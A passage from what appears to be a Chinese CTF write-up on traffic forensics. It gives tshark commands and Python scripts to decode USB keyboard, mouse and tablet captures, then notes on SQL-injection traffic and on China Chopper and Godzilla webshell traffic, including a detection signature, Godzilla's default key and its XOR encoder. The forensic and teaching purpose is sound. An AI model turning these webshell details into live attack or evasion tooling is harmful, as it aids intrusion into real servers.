class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>, <br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt; SPACE &gt; &quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot; + &quot;</span>,<br>             <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;TILDE&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <br>             <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt; F4 &gt; &quot;</span>, <br>             <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot; &lt; F5 &gt; &quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot; &lt; F6 &gt; &quot;</span>,<span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt; F11 &gt; &quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot; &lt; F12 &gt; &quot;</span>&#125;<br>output = []<br>delete_output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">2</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">7</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">8</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">11</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">14</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            <span class="hljs-keyword">if</span> line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;2&#x27;</span>:<br>                output += [shiftKeys[line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]]]<br>            <span class="hljs-keyword">else</span>:<br>                output += [normalKeys[line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]]]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i] == <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag = <span class="hljs-number">1</span> - flag<br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">0</span>:<br>            output[i] = output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>output = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> output <span class="hljs-keyword">if</span> x != <span class="hljs-string">&#x27;&lt;CAP&gt;&#x27;</span>]<br><br>new_output = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">if</span> output[i] == <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>:<br>        delete_output.append(output[i-<span class="hljs-number">1</span>])<br>        new_output = new_output[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        new_output.append(output[i])<br>        <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] 键盘输入的内容为：<span class="hljs-subst">&#123;<span class="hljs-string">&quot;&quot;</span>.join(output)&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] 键盘删除的内容为：<span class="hljs-subst">&#123;<span class="hljs-string">&quot;&quot;</span>.join(delete_output)&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] 最后的结果为：<span class="hljs-subst">&#123;<span class="hljs-string">&quot;&quot;</span>.join(new_output)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>然后有时候还会出现这样一种考点就是：出题人会把关键信息藏在被<code>&lt;DEL&gt;</code>的字符中</p>
<p>因此我们需要把被删除的字符也还原出来</p>
<h3 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h3><blockquote>
<p>键盘流量的数据常见的长度为4字节、6字节、7字节、8字节</p>
</blockquote>
<p>和键盘流量的过程一样，第一步都是先用tshark提取出数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r example.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br>tshark -r example.pcapng -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br><br>tshark -r example.pcapng -Y <span class="hljs-string">&#x27;usb.src == &quot;2.3.1&quot;&#x27;</span> -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br><span class="hljs-comment"># -r：指定了需要读取的文件</span><br><span class="hljs-comment"># -Y：使用过滤器</span><br><span class="hljs-comment"># -T：表示仅仅输出所选字段</span><br><span class="hljs-comment"># -e：指定提取的字段</span><br><span class="hljs-comment"># sed &#x27;/^\s*$/d&#x27;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span><br></code></pre></td></tr></table></figure>

<p>然后和网上那些教程不同，我这里就自己改了一下脚本，就不用多此一举给数据添加冒号了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_XY</span>():<br>    out = <span class="hljs-string">&quot;&quot;</span><br>    posx = <span class="hljs-number">0</span><br>    posy = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read().split()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">8</span>:<br>                flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># 1-左键 2-右键 0-nothing</span><br>                x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>],<span class="hljs-number">16</span>)<br>                y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">12</span>:<br>                flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># 1-左键 2-右键 0-nothing</span><br>                x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)<br>                y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">14</span>:<br>                flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># 1-左键 2-右键 0-nothing</span><br>                x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)<br>                y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">16</span>:<br>                flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># 1-左键 2-右键 0-nothing</span><br>                x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)<br>                y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>)<br>            <br>            <span class="hljs-comment"># 鼠标的移动数据通常是以有符号8位整数的形式存储的，范围是 -128 到 127</span><br>            <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span>:<br>                x -= <span class="hljs-number">256</span><br>            <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span>:<br>                y -= <span class="hljs-number">256</span><br>            <span class="hljs-comment"># 累加距离，算出鼠标当前所在的位置</span><br>            posx += x<br>            posy += y<br>            <span class="hljs-comment"># 查看鼠标左键/右键/nothing的轨迹</span><br>            <span class="hljs-comment"># if flag == 0:</span><br>            <span class="hljs-comment"># if flag == 1:</span><br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">2</span>:<br>                out += <span class="hljs-built_in">str</span>(posx) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(posy) + <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xy.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(out)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">plot</span>():<br>    <span class="hljs-comment"># unpack=True将每列数据分别存储到一个数组中</span><br>    x,y = np.loadtxt(<span class="hljs-string">&quot;xy.txt&quot;</span>,delimiter=<span class="hljs-string">&#x27; &#x27;</span>,unpack=<span class="hljs-literal">True</span>)<br>    plt.plot(x, -y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>    plt.show()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    get_XY()<br>    plot()<br></code></pre></td></tr></table></figure>


<h3 id="数位板流量分析："><a href="#数位板流量分析：" class="headerlink" title="数位板流量分析："></a>数位板流量分析：</h3><p><a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate">例题1-2022浙江省赛决赛-hard_Digital_plate</a></p>
<p>例题2-RoarCTF MISC Davinci_Cipher</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先导出数据并去除空行</span><br>tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; out.txt<br><span class="hljs-comment"># -r 指定了需要读取的文件</span><br><span class="hljs-comment"># -T 表示仅仅输出所选字段</span><br><span class="hljs-comment"># -e 指定提取的字段</span><br><span class="hljs-comment"># 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）</span><br></code></pre></td></tr></table></figure>

<p>类似于：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">08803708951</span>e0<span class="hljs-number">00000000000</span><br><span class="hljs-number">08803708951</span>e0<span class="hljs-number">00000000000</span><br><span class="hljs-number">08803708951</span>e0<span class="hljs-number">00000000000</span><br><span class="hljs-number">08803708951</span>e0<span class="hljs-number">00000000000</span><br><span class="hljs-number">08803708951</span>e0<span class="hljs-number">00000000000</span><br><span class="hljs-number">08813708951</span>e6<span class="hljs-number">50000000000</span><br><span class="hljs-number">08813808951</span>ec<span class="hljs-number">10000000000</span><br><span class="hljs-number">08813908951</span>e2e<span class="hljs-number">0100000000</span><br><span class="hljs-number">08813</span>a08951e<span class="hljs-number">940100000000</span><br><span class="hljs-number">08813</span>b08951ee<span class="hljs-number">20100000000</span><br><span class="hljs-number">08813</span>c08951e1c<span class="hljs-number">0200000000</span><br><span class="hljs-number">08813</span>c08951e<span class="hljs-number">440200000000</span><br><span class="hljs-number">08813</span>c08951e<span class="hljs-number">610200000000</span><br></code></pre></td></tr></table></figure>

<p>需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.read().split()<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_pic1</span>():<br>    x = []<br>    y = []<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>],<span class="hljs-number">16</span>) != <span class="hljs-number">0</span>):<br>            x.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">8</span> | <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>))<br>            y.append(-<span class="hljs-number">1</span> * (<span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>],<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">8</span> | <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>)))<br>    <br>    plt.plot(x,y,<span class="hljs-string">&#x27;.&#x27;</span>)<br>    plt.show()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_pic2</span>():<br>    x = []<br>    y = []<br>    press_lst = []<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>],<span class="hljs-number">16</span>) != <span class="hljs-number">0</span>):<br>            press_data = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>],<span class="hljs-number">16</span>)<br>            press_lst.append(press_data)<br>            <span class="hljs-keyword">if</span>(press_data &lt; <span class="hljs-number">65000</span>):<br>                x.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">8</span> | <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>))<br>                y.append(-<span class="hljs-number">1</span> * (<span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>],<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">8</span> | <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>)))<br>            <br>    plt.plot(x,y,<span class="hljs-string">&#x27;.&#x27;</span>)<br>    plt.show()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    draw_pic1()<br>    <span class="hljs-comment"># draw_pic2()</span><br></code></pre></td></tr></table></figure>

<h2 id="SQL注入流量分析"><a href="#SQL注入流量分析" class="headerlink" title="SQL注入流量分析"></a>SQL注入流量分析</h2><p>可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组</p>
<p>然后使用 tshark 根据字段名提取出所有的注入语句</p>
<p>如果是盲注的话，直接写个正则匹配脚本提取数据即可</p>
<p>例题1-2023 铁三 traffic</p>
<h2 id="Webshell流量分析"><a href="#Webshell流量分析" class="headerlink" title="Webshell流量分析"></a>Webshell流量分析</h2><p>Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是<code>1F 8B 08 00</code></p>
<h3 id="菜刀流量分析"><a href="#菜刀流量分析" class="headerlink" title="菜刀流量分析"></a>菜刀流量分析</h3><p>菜刀流量的一个明显的特征就是，响应里可能有 <code>-&gt;|      |&lt;-</code> 这样的字符串</p>
<p><img src="/imgs/image-20250419164405745.png" srcset="/img/loading.gif" lazyload></p>
<p>流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下</p>
<h3 id="哥斯拉流量分析"><a href="#哥斯拉流量分析" class="headerlink" title="哥斯拉流量分析"></a>哥斯拉流量分析</h3><p>考链接：<a target="_blank" rel="noopener" href="https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></p>
<blockquote>
<p>哥斯拉的默认密钥为：3c6e0b8a9c15224a</p>
</blockquote>
<p>哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES</p>
<p>我们以下面这个编码器为例子，这里要注意异或的时候，是从密钥的第二位开始异或</p>
<p>因此当我们使用CyberChef解密的时候，需要把密钥的第一位移到最后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>一般简单的哥斯拉流量的题目，知道上面这个就能够解密了</p>
<p>当然，也会有题目会考察选手对哥斯拉细节的理解</p>
<p>因此我们就拿下面这个哥斯拉的Webshell为例子，深入分析一下哥斯拉流量的加密流程</p>
